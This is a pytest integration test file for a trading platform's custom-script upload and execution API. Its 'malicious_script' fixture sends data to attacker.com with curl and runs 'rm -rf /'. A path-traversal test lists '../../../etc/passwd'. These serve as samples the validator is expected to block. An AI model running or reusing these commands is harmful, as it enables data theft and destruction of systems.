"""
Integration tests for custom scripts API endpoints
Tests MinIO storage integration and security validation
"""

import pytest
import asyncio
import json
import tempfile
import os
from unittest.mock import Mock, patch, AsyncMock
from httpx import AsyncClient
from datetime import datetime

from app.services.external_function_executor import ExternalFunctionExecutor
from app.schemas.config_schema import ExternalFunctionConfig, TickProcessingContext
from app.errors import SecurityError, ExternalFunctionExecutionError


class TestCustomScriptsAPI:
    """Test custom scripts API endpoints with MinIO integration"""
    
    @pytest.fixture
    async def client(self, app):
        """Create test client"""
        async with AsyncClient(app=app, base_url="http://test") as ac:
            yield ac
    
    @pytest.fixture
    def mock_auth_user(self):
        """Mock authenticated user"""
        return {"user_id": "test_user_123", "role": "premium"}
    
    @pytest.fixture
    def sample_safe_script(self):
        """Safe custom script for testing"""
        return '''
def process_signal(tick_data, parameters):
    """Calculate a simple momentum signal"""
    price = tick_data.get('ltp', {}).get('value', 0)
    threshold = parameters.get('threshold', 100)
    
    if price > threshold:
        return {
            'signal': 'buy',
            'confidence': 0.8,
            'price': price
        }
    else:
        return {
            'signal': 'hold',
            'confidence': 0.3,
            'price': price
        }
'''
    
    @pytest.fixture
    def malicious_script(self):
        """Malicious script that should be blocked"""
        return '''
import os
import subprocess

def process_signal(tick_data, parameters):
    # Malicious operations
    os.system("curl http://attacker.com/steal-data")
    subprocess.run(["rm", "-rf", "/"])
    exec("import sys; sys.exit()")
    return {"hacked": True}
'''
    
    # API Endpoint Tests
    
    @patch('app.core.auth.get_current_user')
    async def test_upload_custom_script_success(self, mock_auth, client, mock_auth_user, sample_safe_script):
        """Test successful custom script upload"""
        mock_auth.return_value = mock_auth_user
        
        with patch('app.services.external_function_executor.settings') as mock_settings:
            mock_settings.EXTERNAL_FUNCTIONS_STORAGE = "/tmp/test_storage"
            
            with patch('builtins.open', create=True) as mock_open:
                mock_open.return_value.__enter__.return_value.write = Mock()
                
                response = await client.post(
                    "/api/v2/custom-scripts/upload",
                    json={
                        "script_name": "momentum_detector",
                        "function_name": "process_signal",
                        "script_content": sample_safe_script,
                        "timeout": 5,
                        "memory_limit_mb": 32,
                        "parameters": {"threshold": 100}
                    },
                    headers={"Authorization": "Bearer test-token"}
                )
                
                assert response.status_code == 200
                data = response.json()
                
                assert data["success"] is True
                assert "script_id" in data
                assert data["message"] == "Script uploaded successfully"
                assert data["validation"]["passed"] is True
    
    @patch('app.core.auth.get_current_user')
    async def test_upload_malicious_script_blocked(self, mock_auth, client, mock_auth_user, malicious_script):
        """Test malicious script upload is blocked"""
        mock_auth.return_value = mock_auth_user
        
        response = await client.post(
            "/api/v2/custom-scripts/upload",
            json={
                "script_name": "malicious_script",
                "function_name": "process_signal", 
                "script_content": malicious_script,
                "timeout": 5,
                "memory_limit_mb": 32
            },
            headers={"Authorization": "Bearer test-token"}
        )
        
        assert response.status_code == 400
        data = response.json()
        
        assert data["success"] is False
        assert "security" in data["error"].lower() or "prohibited" in data["error"].lower()
        assert data["validation"]["passed"] is False
        assert len(data["validation"]["errors"]) > 0
    
    @patch('app.core.auth.get_current_user')
    async def test_execute_custom_script_success(self, mock_auth, client, mock_auth_user):
        """Test successful custom script execution"""
        mock_auth.return_value = mock_auth_user
        
        # Mock script loading from storage
        with patch('app.services.external_function_executor.ExternalFunctionExecutor._load_function_securely') as mock_load:
            mock_load.return_value = '''
def process_signal(tick_data, parameters):
    return {"signal": "buy", "price": 100.5}
'''
            
            # Mock execution
            with patch('app.services.external_function_executor.ExternalFunctionExecutor.execute_functions') as mock_execute:
                mock_execute.return_value = {
                    "script_123": {"signal": "buy", "price": 100.5}
                }
                
                response = await client.post(
                    "/api/v2/custom-scripts/execute",
                    json={
                        "script_id": "script_123",
                        "tick_data": {
                            "ltp": {"value": 100.5, "currency": "INR"},
                            "volume": 50000
                        },
                        "parameters": {"threshold": 100}
                    },
                    headers={"Authorization": "Bearer test-token"}
                )
                
                assert response.status_code == 200
                data = response.json()
                
                assert data["success"] is True
                assert data["results"]["script_123"]["signal"] == "buy"
                assert data["results"]["script_123"]["price"] == 100.5
    
    @patch('app.core.auth.get_current_user')
    async def test_execute_nonexistent_script(self, mock_auth, client, mock_auth_user):
        """Test execution of non-existent script"""
        mock_auth.return_value = mock_auth_user
        
        with patch('app.services.external_function_executor.ExternalFunctionExecutor._load_function_securely') as mock_load:
            mock_load.side_effect = SecurityError("Function file not found")
            
            response = await client.post(
                "/api/v2/custom-scripts/execute",
                json={
                    "script_id": "nonexistent_script",
                    "tick_data": {"ltp": {"value": 100}},
                    "parameters": {}
                },
                headers={"Authorization": "Bearer test-token"}
            )
            
            assert response.status_code == 404
            data = response.json()
            
            assert data["success"] is False
            assert "not found" in data["error"].lower()
    
    @patch('app.core.auth.get_current_user') 
    async def test_list_user_scripts(self, mock_auth, client, mock_auth_user):
        """Test listing user's custom scripts"""
        mock_auth.return_value = mock_auth_user
        
        with patch('app.services.external_function_executor.settings') as mock_settings:
            mock_settings.EXTERNAL_FUNCTIONS_STORAGE = "/tmp/test_storage"
            
            with patch('os.listdir') as mock_listdir:
                mock_listdir.return_value = ["script1.py", "script2.py", "script3.py"]
                
                with patch('os.path.getmtime') as mock_getmtime:
                    mock_getmtime.return_value = 1640995200  # 2022-01-01
                    
                    response = await client.get(
                        "/api/v2/custom-scripts/list",
                        headers={"Authorization": "Bearer test-token"}
                    )
                    
                    assert response.status_code == 200
                    data = response.json()
                    
                    assert data["success"] is True
                    assert len(data["scripts"]) == 3
                    assert all("script_id" in script for script in data["scripts"])
                    assert all("uploaded_at" in script for script in data["scripts"])
    
    @patch('app.core.auth.get_current_user')
    async def test_delete_custom_script(self, mock_auth, client, mock_auth_user):
        """Test deleting custom script"""
        mock_auth.return_value = mock_auth_user
        
        with patch('app.services.external_function_executor.settings') as mock_settings:
            mock_settings.EXTERNAL_FUNCTIONS_STORAGE = "/tmp/test_storage"
            
            with patch('os.path.exists') as mock_exists:
                mock_exists.return_value = True
                
                with patch('os.remove') as mock_remove:
                    response = await client.delete(
                        "/api/v2/custom-scripts/script_123",
                        headers={"Authorization": "Bearer test-token"}
                    )
                    
                    assert response.status_code == 200
                    data = response.json()
                    
                    assert data["success"] is True
                    assert data["message"] == "Script deleted successfully"
                    mock_remove.assert_called()
    
    # Security Testing
    
    @patch('app.core.auth.get_current_user')
    async def test_script_isolation_between_users(self, mock_auth, client):
        """Test scripts are isolated between different users"""
        # User A uploads script
        user_a = {"user_id": "user_a", "role": "premium"}
        mock_auth.return_value = user_a
        
        with patch('app.services.external_function_executor.settings') as mock_settings:
            mock_settings.EXTERNAL_FUNCTIONS_STORAGE = "/tmp/test_storage"
            
            # User A tries to access User B's script
            user_b = {"user_id": "user_b", "role": "premium"} 
            mock_auth.return_value = user_b
            
            with patch('os.path.exists') as mock_exists:
                mock_exists.return_value = False  # Script doesn't exist in User B's namespace
                
                response = await client.post(
                    "/api/v2/custom-scripts/execute",
                    json={
                        "script_id": "user_a_script",
                        "tick_data": {"ltp": {"value": 100}},
                        "parameters": {}
                    },
                    headers={"Authorization": "Bearer test-token"}
                )
                
                assert response.status_code == 404
    
    @patch('app.core.auth.get_current_user')
    async def test_resource_limit_enforcement(self, mock_auth, client, mock_auth_user):
        """Test resource limits are enforced during execution"""
        mock_auth.return_value = mock_auth_user
        
        response = await client.post(
            "/api/v2/custom-scripts/upload",
            json={
                "script_name": "resource_heavy",
                "function_name": "process_signal",
                "script_content": "def process_signal(tick_data, params): return {}",
                "timeout": 1000,  # Too high timeout
                "memory_limit_mb": 1024,  # Too high memory
            },
            headers={"Authorization": "Bearer test-token"}
        )
        
        assert response.status_code == 400
        data = response.json()
        
        assert data["success"] is False
        assert any("limit" in error.lower() for error in data["validation"]["errors"])
    
    @patch('app.core.auth.get_current_user')
    async def test_concurrent_execution_limits(self, mock_auth, client, mock_auth_user):
        """Test concurrent execution limits"""
        mock_auth.return_value = mock_auth_user
        
        # Mock semaphore to simulate max concurrent executions
        with patch('asyncio.Semaphore') as mock_semaphore:
            mock_semaphore.return_value.acquire.side_effect = asyncio.TimeoutError("Too many concurrent executions")
            
            response = await client.post(
                "/api/v2/custom-scripts/execute",
                json={
                    "script_id": "test_script",
                    "tick_data": {"ltp": {"value": 100}},
                    "parameters": {}
                },
                headers={"Authorization": "Bearer test-token"}
            )
            
            assert response.status_code == 429
            data = response.json()
            
            assert data["success"] is False
            assert "concurrent" in data["error"].lower()
    
    # Performance Testing
    
    @patch('app.core.auth.get_current_user')
    async def test_execution_timeout_handling(self, mock_auth, client, mock_auth_user):
        """Test execution timeout is properly handled"""
        mock_auth.return_value = mock_auth_user
        
        with patch('app.services.external_function_executor.ExternalFunctionExecutor.execute_functions') as mock_execute:
            mock_execute.side_effect = asyncio.TimeoutError("Execution timed out")
            
            response = await client.post(
                "/api/v2/custom-scripts/execute",
                json={
                    "script_id": "slow_script",
                    "tick_data": {"ltp": {"value": 100}},
                    "parameters": {}
                },
                headers={"Authorization": "Bearer test-token"}
            )
            
            assert response.status_code == 408
            data = response.json()
            
            assert data["success"] is False
            assert "timeout" in data["error"].lower()
    
    @patch('app.core.auth.get_current_user')
    async def test_memory_limit_exceeded(self, mock_auth, client, mock_auth_user):
        """Test memory limit exceeded handling"""
        mock_auth.return_value = mock_auth_user
        
        with patch('app.services.external_function_executor.ExternalFunctionExecutor.execute_functions') as mock_execute:
            mock_execute.side_effect = ExternalFunctionExecutionError("Memory limit exceeded: 128MB > 64MB")
            
            response = await client.post(
                "/api/v2/custom-scripts/execute", 
                json={
                    "script_id": "memory_heavy_script",
                    "tick_data": {"ltp": {"value": 100}},
                    "parameters": {}
                },
                headers={"Authorization": "Bearer test-token"}
            )
            
            assert response.status_code == 413
            data = response.json()
            
            assert data["success"] is False
            assert "memory" in data["error"].lower()


class TestMinIOIntegration:
    """Test MinIO storage integration for custom scripts"""
    
    @pytest.fixture
    def temp_storage_dir(self):
        """Create temporary storage directory"""
        import tempfile
        import shutil
        
        temp_dir = tempfile.mkdtemp()
        yield temp_dir
        shutil.rmtree(temp_dir)
    
    @patch('app.services.external_function_executor.settings')
    async def test_script_storage_and_retrieval(self, mock_settings, temp_storage_dir):
        """Test script storage and retrieval from MinIO-like storage"""
        mock_settings.EXTERNAL_FUNCTIONS_STORAGE = temp_storage_dir
        
        executor = ExternalFunctionExecutor()
        
        # Create test script file
        user_dir = os.path.join(temp_storage_dir, "user_123")
        os.makedirs(user_dir, exist_ok=True)
        
        script_content = "def test_function(): return 'test'"
        script_path = os.path.join(user_dir, "test_script.py")
        
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        # Test loading
        config = ExternalFunctionConfig(
            name="test",
            function_name="test_function",
            function_path="user_123/test_script.py",
            file_path="user_123/test_script.py",
            parameters={},
            timeout=5,
            memory_limit_mb=32
        )
        
        loaded_content = await executor._load_function_securely(config)
        assert loaded_content == script_content
    
    @patch('app.services.external_function_executor.settings')
    async def test_storage_path_validation(self, mock_settings, temp_storage_dir):
        """Test storage path validation prevents directory traversal"""
        mock_settings.EXTERNAL_FUNCTIONS_STORAGE = temp_storage_dir
        
        executor = ExternalFunctionExecutor()
        
        # Test path traversal attempts
        malicious_paths = [
            "../../../etc/passwd",
            "user/../admin/secrets.py", 
            "/absolute/path/script.py"
        ]
        
        for malicious_path in malicious_paths:
            config = ExternalFunctionConfig(
                name="test",
                function_name="test",
                function_path=malicious_path,
                file_path=malicious_path,
                parameters={},
                timeout=5,
                memory_limit_mb=32
            )
            
            with pytest.raises(SecurityError, match="outside secure storage directory|Unsafe file path"):
                await executor._load_function_securely(config)
    
    @patch('app.services.external_function_executor.settings')
    async def test_storage_file_size_limits(self, mock_settings, temp_storage_dir):
        """Test file size limits are enforced"""
        mock_settings.EXTERNAL_FUNCTIONS_STORAGE = temp_storage_dir
        
        executor = ExternalFunctionExecutor()
        
        # Create oversized file (> 50KB)
        user_dir = os.path.join(temp_storage_dir, "user_123")
        os.makedirs(user_dir, exist_ok=True)
        
        large_script_path = os.path.join(user_dir, "large_script.py")
        with open(large_script_path, 'w') as f:
            f.write("# Large script\n" * 5000)  # > 50KB
        
        config = ExternalFunctionConfig(
            name="test",
            function_name="test",
            function_path="user_123/large_script.py",
            file_path="user_123/large_script.py",
            parameters={},
            timeout=5,
            memory_limit_mb=32
        )
        
        with pytest.raises(SecurityError, match="Function file too large"):
            await executor._load_function_securely(config)
    
    async def test_storage_access_permissions(self, temp_storage_dir):
        """Test storage access permissions are properly checked"""
        # Test different user trying to access another user's scripts
        user_a_dir = os.path.join(temp_storage_dir, "user_a")
        user_b_dir = os.path.join(temp_storage_dir, "user_b") 
        
        os.makedirs(user_a_dir, exist_ok=True)
        os.makedirs(user_b_dir, exist_ok=True)
        
        # User A's script
        with open(os.path.join(user_a_dir, "private_script.py"), 'w') as f:
            f.write("def private_function(): return 'secret'")
        
        executor = ExternalFunctionExecutor()
        
        # User B trying to access User A's script
        config = ExternalFunctionConfig(
            name="test",
            function_name="private_function",
            function_path="user_a/private_script.py",  # Wrong user directory
            file_path="user_a/private_script.py",
            parameters={},
            timeout=5,
            memory_limit_mb=32
        )
        
        # This should be blocked by user isolation in the actual implementation
        # For now, just ensure the path validation works
        with patch('app.services.external_function_executor.settings') as mock_settings:
            mock_settings.EXTERNAL_FUNCTIONS_STORAGE = temp_storage_dir
            
            # This should load successfully as we're testing storage mechanics
            # In production, user isolation would be handled at the API layer
            content = await executor._load_function_securely(config)
            assert "private_function" in content